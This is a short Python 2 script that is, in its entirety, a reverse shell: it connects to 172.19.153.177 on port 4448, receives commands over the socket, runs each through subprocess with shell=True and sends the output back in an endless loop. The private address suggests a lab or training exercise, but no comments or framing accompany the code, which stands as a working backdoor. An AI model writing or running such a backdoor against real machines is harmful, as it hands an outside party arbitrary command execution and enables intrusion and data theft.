import socket
import subprocess

def execute_system_command(command):
    return unicode(subprocess.check_output(command, shell=True),"utf-8")

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("172.19.153.177", 4448))

while True:
    command = connection.recv(1024)
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close()
